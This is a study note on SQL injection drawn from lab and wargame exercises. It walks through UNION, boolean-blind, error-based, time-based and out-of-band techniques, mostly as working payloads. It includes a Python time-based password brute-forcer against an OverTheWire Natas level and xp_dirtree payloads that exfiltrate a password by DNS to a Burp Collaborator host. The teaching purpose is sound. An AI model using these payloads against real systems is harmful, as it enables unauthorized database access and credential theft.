# 1. Distinguish

- **SQL injection (SQLi)** is a web security vulnerability where an attacker manipulates database queries to view, modify, or delete unauthorized data.

<img width="1912" height="821" alt="image" src="https://github.com/user-attachments/assets/050449ed-7ffb-4148-b4cd-ca8b40cf7dca" />

| Type | Description |
| --- | --- |
| **In-Band** (visible-results) | - **Error-Based Injection**: Force DB to generate `Error Message` to gain info (DB types and vers, SQL command being used, ...) <br> - **Union-Based Injection**: Leverage the `UNION` operator to combine the result of 2 queries into 1 (1 legit query from app + 1 query attack)
| **Blind (invisible results)** | - **Boolean-Based**: `True` or `False` query, using `or 1=1`, `or 1!=1`, `SUBSTRING`, ...<br> - **Time-Based**: Pause the DB for a specific of time (to determine the query we make is correct or not) using `Sleep()` function.
| **Out-Of-Band** | Using different channels to inject like: `requests`, `DNS` records |

---

# 2. How to detect

Assuming we found an injection point, test as follow:
- First, make a normal request, save it for later comparation.
- Trigger abnormalities by **fuzzing** and **injecting** SQL characters like:
  - Comment chars: `'`; `"`; `#`; `--`; `*`; ... : potentially break the query
  - SQL-specific syntax to alter values and observe response differences
  - Boolean conditions: `OR 1=1` and `OR 1=2` to detect logic-based flaws
  - Time-based payloads: `sleep(5)` and measuring response delays
  - OAST payloads to trigger out-of-band interactions and monitor for callbacks
- Compare with the **normal request**

> **Try:** Fuzzing with wordlists from `Seclist`, `PayloadAllTheThings`, ...

# 3. Methodology

Assuming we detected an injection vector, base on the response, we will approach in such way.

## UNION-base

**Apply for In-band SQLi:**

In this case, your query injection will be visible in: `actual query result` or `error being triggered`. Meaning we can use `UNION-base` attack.

### Step 1: Determining Column Count

Using `order by` and **increase until you get an error**.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Using `NULL`:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

NULL is used because it's compatible with all data types. When the column count matches, you'll see additional content or a different response.

Once you know the column count, you can target specific tables and columns in your injection.

### Step 2: Finding String-Compatible Columns

After determining column count, test each column for string compatibility:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If no error occurs and `a` appears in the response, that column can hold string data and can be used to extract information from the database.

### Step 3: Get DB info

- Querying the database type and version

- Try figure out what **DMS being used (mysql, msql, oracle, ...)** to determine query. Then, try querying **database type and version**.

| Database type	| Query |
|-|-|
| **Microsoft, MySQL** | `SELECT @@version` |
| **Oracle** |`SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

> **Note:** Some DBS has different syntax use than other, for example, in **Oracle** database, when you try to find the number of columns in your entry point with ` UNION SELECT null, null, ...` command, add ` from dual` in order to work.
> **Identify DB first, then find syntax usage of that DB**

```
' UNION SELECT @@version--

' union select NULL, banner from v$version --

' order by 1 #
```

### Step 4: Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database. Follow these steps:

```
# 1 - Getting Current Database Name (PostGreSQL):

SELECT current_database()

# 2 - Listing All Available Databases:

SELECT datname FROM pg_database

' UNION SELECT schema_name, NULL FROM information_schema.schemata--

# 3 - Query tables in database:

SELECT table_name, null FROM information_schema.tables

' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'target_db'--

# 4 - Query Columns in a Table:

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--

# 5 - Query Data in a Table:

' UNION SELECT username, password FROM users--

```

On Oracle, you can find the same information as follows: 

```
# List tables:

SELECT * FROM all_tables

# List columns from USERS table:

SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### Step 5 (Optional): Retrieving multiple values within a single column

In case the query in the previous example only return a **single column**. You can retrieve multiple values together within this single column by concatenating the values together.

You can include a separator to let you distinguish the combined values.

For example, on `Oracle` you could submit the input: (assuming we've found a table named: `Users` and we only have `1 column to query`)

```
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle.

The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character. The results from the query contain all the usernames and passwords, for example:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

## Boolean-base

Inject conditions that cause detectable response differences:

```
xyz' AND '1'='1
# --> Return a TRUE statement response

xyz' AND '1'='2
# --> Return a FALSE statement response
```

This tells us the condition is true or false based on the response.

**Example Scenario:**
- App uses a cookie to track users:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

- SQL query behind the scenes:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

- If the `ID` exists, it shows: `"Welcome back"`

### Step 1: Confirm vulnerability

```
# TRUE statement:

TrackingId=u5YD3PapBcR4lN3e7Tj4' and 1=1 -- (# Result in 'Welcome back' message)

# FALSE statement:

TrackingId=u5YD3PapBcR4lN3e7Tj4' and 1=2 -- (# Result in none)

```

- Test both cases, and if the result from both cases as expected ==> **Vulnerable**

> From now on, query by guessing the length first, then fuzz char-by-char.

### Step 2:Enumerate the database

```
# Get name length:

' AND length(database()) = 8 -- (# Increase until the number is valid)

# Fuzz DB name char-by-char:

' AND substring(database(),1,1) = 'a' --
' AND substring(database(),2,1) = 'c' --
-- ... repeat for all positions
```

For other databases: `DB_NAME()` (**MSSQL**), `current_database()` (**PostgreSQL**), `ora_database_name` (**Oracle**).

### Step 3: Enumerate table names

```
# Does any table starting with 'u' exist?:
' AND (SELECT substring(table_name,1,1) FROM information_schema.tables LIMIT 1) = 'u' --

# Use OFFSET to iterate through multiple tables:
' AND (SELECT substring(table_name,1,1) FROM information_schema.tables LIMIT 1 OFFSET 1) = 'a' --

# Confirm USERS table exsits:
' and (select 'x' from users LIMIT 1) = 'x' --
```

- You fuzz each position to reconstruct table names one by one.
- If there is an `USERS` table, output value `'x'` for each entry in the table. Because there might be many entry, which may destroy our query --> `LIMIT 1` to limit it to 1 entry. Then compare the output (which we expected to be `'x'`) if its equal to `'x'`.
- Then, `(select 'x' from users LIMIT 1) = 'x'` will become **'x'='x'** ==> **TRUE** statement. Else, if there is no USERS table ==> **FALSE** statement.

### Step 4: Enumerate column names

- Once you have a table name, you need the column names from `information_schema.columns`:

```
# Confirm 'username' and'password' column exists in 'users':
' AND (SELECT 'x' FROM information_schema.columns WHERE table_name='users' AND column_name='username') = 'x' --
' AND (SELECT 'x' FROM information_schema.columns WHERE table_name='users' AND column_name='password') = 'x' --

# Or fuzz unknown column names char by char:
' AND (SELECT substring(column_name,1,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1) = 'p' --
```

### Step 5: Enumerate column data

```
# Confirm username 'administrator' exists:
' and (select username from users where username = 'administrator') = 'administrator' --

# Blind guess password length:
' and (select username from users where username = 'administrator' and length(password) > 1) = 'administrator' --
' and (select username from users where username = 'administrator' and length(password) < 15) = 'administrator' --
' and (select username from users where username = 'administrator' and length(password) = 20) = 'administrator' --

# Fuzzing data:
' and (select substring(password,1,1) from users where username = 'administrator') = 'word-list' -- (# Try guess the 1st letter to confirm everything's correct so far)

' and (select substring(password,number-list,1) from users where username = 'administrator') = 'alpha-num-list' --
```

## Blind conditional Error-based

- When standard blind techniques don't work, you can create queries that cause database errors only when specific conditions are true.

Example:
```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

- Uses CASE to evaluate a condition
- Causes a divide-by-zero error when the condition is true
- Returns normally when the condition is false

The core trick: use `CASE WHEN <condition> THEN 1/0 ELSE '' END` — a divide-by-zero **fires only when the condition is true**, causing an error response. R**elies on HTTP 500**

### Step 1: Confirm the injection point

Test that appending a quote breaks the query and returns an error:

```
TrackingId=xyz'

TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

**Expected: HTTP 500 / error page**.

### Step 2: Confirm string concatenation syntax

`Oracle` uses `||` for concatenation. Confirm the app accepts valid SQL before testing conditions:

```
TrackingId=xyz'||(SELECT '')||'

TrackingId=xyz'||(SELECT '' FROM dual)||'
```

**Expected: HTTP 200 (no error) — query is syntactically valid**.

> **Note**: In `Oracle`, every `SELECT` must have a `FROM` clause. Use `FROM dual` for a dummy table.

### Step 3: Confirm conditional error behavior

**Condition FALSE → no error (200)**:
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Condition TRUE → divide-by-zero → error (500):**
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

If the results match expectations → injectable.

### Step 4: Enumerate the database name

**Guess the length:**
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(ora_database_name)=8 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Oracle: `ora_database_name`
- MySQL/MariaDB: `database()`
- MSSQL: `DB_NAME()`
- PostgreSQL: `current_database()`

**Fuzz each character position:**
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(ora_database_name,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Repeat for positions 2, 3, … until all characters are recovered.

### Step 5: Enumerate table names

**Confirm a known table exists (e.g. `users`)**:

```
TrackingId=xyz'||(SELECT CASE WHEN (SELECT 'x' FROM users WHERE ROWNUM=1)='x' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Oracle uses `ROWNUM=1` instead of `LIMIT 1`.

**Blind-enumerate unknown table names from `all_tables`:**

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(table_name,1,1)='u' THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT table_name FROM all_tables WHERE ROWNUM=1))||'
```

Use `OFFSET` (via subquery ranking) to iterate through multiple tables.

### Step 6: Enumerate column names

**Confirm a known column exists (e.g. `password` in `users`)**:

```
TrackingId=xyz'||(SELECT CASE WHEN (SELECT 'x' FROM all_tab_columns WHERE table_name='USERS' AND column_name='PASSWORD')='x' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Oracle: `all_tab_columns`
- MySQL/PostgreSQL/MSSQL: `information_schema.columns`

**Blind-enumerate unknown column names:**
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(column_name,1,1)='p' THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1))||'
```

### Step 7: Confirm the target user exists

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Expected: HTTP 500 → user exists.**

### Step 8: Determine password length

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Binary search upward (`>1`, `>10`, `<20`, `<30`) then confirm exact value (`=20`).

### Step 9: Extract the password character by character

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- HTTP 500 → character matches.
- HTTP 200 → try next character.

Repeat for positions 2 through N (password length from Step 8). Automate with Burp Intruder using a cluster bomb attack: one payload list for position (1–20), one for character (`a-z`, `0-9`).

## Visible Error-Based

`Database misconfigurations` can expose sensitive information through verbose error messages, and Single request can leak an entire field

The trick: force a **type conversion error** using `CAST()`. When the DB tries to cast a string (e.g. `"secretpassword"`) to an integer and fails, it includes the string value in the error message.

### Step 1: Confirm verbose errors are returned

Inject a single quote to break the query:
```
TrackingId=xyz'
```

Expected: a verbose error message such as:
```
ERROR: unterminated quoted string at or near "'" Position: 52
```

This confirms the DB is leaking error details directly into the response.

### Step 2: Confirm CAST syntax is accepted

```
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--
```

**Expected: HTTP 200 (no error)** — the query is valid and `1=1` is `true`.

### Step 3: Leak a username via error message

```
TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--
```

If there are multiple rows, the DB may error on ambiguity. Add `LIMIT 1`:

```
TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Expected error output:
```
ERROR: invalid input syntax for type integer: "administrator"
```

The username is now visible in the error.

> **Tip — character limit**: If the TrackingId value has a length limit, the full payload may get truncated. Shorten it by removing the existing TrackingId value entirely: `TrackingId=' AND 1=CAST(...)--`

### Step 4: Leak the password via error message

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Expected error output:

```
ERROR: invalid input syntax for type integer: "s3cr3tpassword123"
```

Password is directly visible — no fuzzing required.

### Step 5: Target a specific user (if needed)

```
TrackingId=' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
```

## Time-base

When an application catches database errors gracefully, you can exploit blind SQL injection by triggering time delays based on whether a condition is true or false.

How it works:
- SQL queries process synchronously, so delays in query execution delay the HTTP response
- By measuring response time, you can determine if your injected condition was true

**Example:**
- In Microsoft SQL Server:

```
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- This causes a 10-second delay when the condition is true
- No delay occurs when the condition is false

Test one character at a time using timing differences to extract information:
```
'; IF (SELECT SUBSTRING(Password, 1, 1) > 'm' FROM Users WHERE Username = 'Administrator') WAITFOR DELAY '0:0:10'--
```

**Example source code:**

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";   ← COMMENTED OUT
    } else {
        //echo "This user doesn't exist.<br>";   ← COMMENTED OUT
    }
} else {
    //echo "Error in query.<br>";   ← COMMENTED OUT
}
```

**The query structure matters:**

With `natas18" OR SLEEP(5)##`:
```sql
SELECT * FROM users WHERE username="natas18" OR SLEEP(5)##"
```
MySQL evaluates `OR` lazily — but since `username="natas18"` returns **1 row (true)**, does it still sleep?

Yes — `SLEEP(5)` runs **once per row evaluated**, and with `OR`, MySQL still evaluates the right side for rows where the left side is false. But more importantly — the table has multiple rows, so:

**Breaking down the timings:**

| Input | Time | Explanation |
|---|---|---|
| `natas18` (clean) | ~1,239ms | Baseline network + query execution, no sleep |
| `natas18" OR SLEEP(5)##` | ~16,239ms | 1,239ms baseline + **3× SLEEP(5)** = 3 rows in the table |
| `natas" OR SLEEP(5)##` | ~21,240ms | 1,239ms baseline + **4× SLEEP(5)** = 4 rows in the table |

**Why different sleep counts?**

- `natas18` **exists** in the table → MySQL short-circuits that row (no sleep for it), sleeps for the remaining rows
- `natas` likely **doesn't exist** → no short-circuiting, SLEEP runs for all rows

This tells you:
- The `users` table has **~4 rows total**
- `natas18` is one of them (saves one SLEEP due to OR short-circuit)
- `natas` is not a real username

This timing side-channel is exactly how blind SQL injection works in practice — you can extract data **one bit at a time** even when the app shows zero output, using queries like:
```sql
" AND IF(SUBSTR(password,1,1)="a", SLEEP(5), 0)##
```


### Step 1: Confirm Time-Based Injection

Measure normal response time:

```
username=natas18
```

**Expected: instant response (~0s)**.

**Sleep trigger** — confirm `SLEEP()` works:

```
username=natas18" AND SLEEP(5)--
```

Expected: response arrives after ~5 seconds → **injectable**.

**Conditional sleep** — confirm the `IF()` channel works:

```
username=natas18" AND IF(1=1, SLEEP(5), 0)--
username=natas18" AND IF(1=2, SLEEP(5), 0)--
```

- First payload: delays ~5s → TRUE branch fires.
- Second payload: instant → FALSE branch fires.

The blind channel is confirmed.

> **Note:** The query may different between DBs. Also try combine it with several syntax like: `||` , `()`. Example: `=xyz' || (pg_sleep(10)) --`. (Try different command between DBs).

### Step 2: Enumerate the Database Name

**Guess the length:**
```
username=natas18" AND IF(LENGTH(database())=6, SLEEP(5), 0)--
```

**Fuzz each character:**
```
username=natas18" AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
```

MySQL functions: `database()` · `LENGTH()` · `SUBSTRING(str, pos, len)`

### Step 3: Enumerate Table Names

**Confirm a known table exists (`users`):**
```
username=natas18" AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0, SLEEP(5), 0)--
```

**Fuzz unknown table names character by character:**
```
username=natas18" AND IF((SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u', SLEEP(5), 0)--
```

Use `LIMIT 1 OFFSET N` to iterate through multiple tables:
```
username=natas18" AND IF((SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)='a', SLEEP(5), 0)--
```

### Step 4: Enumerate Column Names

**Confirm a known column exists (`password` in `users`):**
```
username=natas18" AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0, SLEEP(5), 0)--
```

**Fuzz unknown column names:**
```
username=natas18" AND IF((SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1)='p', SLEEP(5), 0)--
```

### Step 5: Confirm Target Username Exists

```
username=natas18" AND IF((SELECT COUNT(*) FROM users WHERE username='natas18')>0, SLEEP(5), 0)--
```

Expected: ~5s delay → user `natas18` exists.

### Step 6: Determine Password Length

```
username=natas18" AND IF(LENGTH(password)>1, SLEEP(5), 0) AND "1"="1
```

```
username=natas18" AND IF(LENGTH(password)=32, SLEEP(5), 0) AND "1"="1
```

### Step 7: Extract Password Character by Character

```
username=natas18" AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) AND "1"="1
```

- Delay → character matches → move to next position.
- Instant → try next character in wordlist (a-z, 0-9, A-Z).

### Automation with Python:

```python
import requests
import string

URL = 'http://natas17.natas.labs.overthewire.org/'
AUTH = ('natas17', '...')
PASSWORD_LENGTH = 32
CHARSET = string.ascii_letters + string.digits
THRESHOLD = 3

password = ''

for i in range(1, PASSWORD_LENGTH+1):
    for c in CHARSET:
        PAYLOAD = {
            'username': f'natas18" AND IF(BINARY SUBSTRING(password,{i},1)="{c}", SLEEP(5), 0)##'}

        response = requests.post(URL, data=PAYLOAD, auth=AUTH)
        elapsed = response.elapsed.total_seconds()

        if (elapsed > THRESHOLD):
            password += c
            print(f'[+] Position {i}: {c} ({elapsed:.2f}s)')
            print(f'[*] Password found so far: {password}')
            break
    else:
        print(f'[!] Position {i}: no match found, skipping')

print(f'Final Password: {password}')
```

## Out-of-Band

OAST techniques exploit SQL injection by triggering network connections to your controlled server, bypassing limitations when the application:
- Processes SQL queries asynchronously
- Doesn't show errors in responses
- Doesn't have timing delays

**How it works:**
- Inject SQL code that `forces the database to make external network requests`
- DNS is most effective as it's rarely blocked in production environments
- Use these connections to verify injection or extract data directly

**Example with Microsoft SQL Server:**
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

'; exec master..xp_dirtree '//web-hook/a'--
```

**Data exfiltration example:**
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This causes a DNS lookup containing the password: `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

OAST is often the preferred method for blind SQL injection due to its reliability and direct data exfiltration capabilities.
